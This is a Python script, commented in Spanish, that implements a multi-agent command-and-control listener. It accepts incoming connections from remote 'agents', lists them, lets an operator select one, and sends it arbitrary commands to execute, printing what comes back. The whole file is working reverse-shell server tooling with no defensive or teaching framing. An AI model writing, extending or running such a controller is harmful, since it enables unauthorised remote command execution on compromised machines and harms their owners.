import socket
import threading

agents = []
total_agents = 0

class Agent(threading.Thread):
    def __init__(self, socket, address, id):
        threading.Thread.__init__(self)
        self.socket = socket
        self.address = address
        self.id = id
        self.signal = True
        self.daemon = True  # muere si el main thread muere

    def run(self):
        while self.signal:
            try:
                data = self.socket.recv(4096)  # 4096 en vez de 32
                if data:
                    output = data.decode("utf-8", errors="replace")
                    print(f"\n[Agent {self.id}] {output}")
                    print(">> ", end="", flush=True)
            except:
                print(f"\n[!] Agent {self.id} ({self.address[0]}) desconectado")
                self.signal = False
                if self in agents:
                    agents.remove(self)
                break

    def send(self, cmd):
        self.socket.sendall(cmd.encode())


def accept_connections(server_socket):
    global total_agents
    while True:
        conn, addr = server_socket.accept()
        agent = Agent(conn, addr, total_agents)
        agents.append(agent)
        agent.start()
        print(f"\n[+] Nuevo agente: ID {total_agents} desde {addr[0]}:{addr[1]}")
        print(">> ", end="", flush=True)
        total_agents += 1


def list_agents():
    if not agents:
        print("[*] Sin agentes conectados")
        return
    print("\n[*] Agentes activos:")
    for a in agents:
        status = "OK" if a.signal else "MUERTO"
        print(f"  [{a.id}] {a.address[0]}:{a.address[1]} — {status}")


def main():
    host = input("Host: ")
    port = int(input("Port: "))

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # evita "address already in use"
    sock.bind((host, port))
    sock.listen(5)
    print(f"[*] Escuchando en {host}:{port}")

    threading.Thread(target=accept_connections, args=(sock,), daemon=True).start()

    current_agent = None

    while True:
        cmd = input(">> ").strip()

        if cmd == "":
            continue
        elif cmd == "help":
            print("  list       → lista agentes")
            print("  use <id>   → seleccionar agente")
            print("  exit       → salir")
            print("  <cmd>      → ejecutar en el agente seleccionado")
        elif cmd == "list":
            list_agents()
        elif cmd.startswith("use "):
            try:
                agent_id = int(cmd.split()[1])
                found = next((a for a in agents if a.id == agent_id), None)
                if found:
                    current_agent = found
                    print(f"[*] Agente {agent_id} seleccionado")
                else:
                    print(f"[!] ID {agent_id} no encontrado")
            except:
                print("[!] Uso: use <id>")
        elif cmd == "exit":
            if current_agent:
                current_agent.send("exit")
            break
        else:
            if current_agent is None:
                print("[!] Ningún agente seleccionado. Usá 'list' y después 'use <id>'")
            elif not current_agent.signal:
                print(f"[!] Agente {current_agent.id} desconectado")
                current_agent = None
            else:
                current_agent.send(cmd)


if __name__ == "__main__":
    main()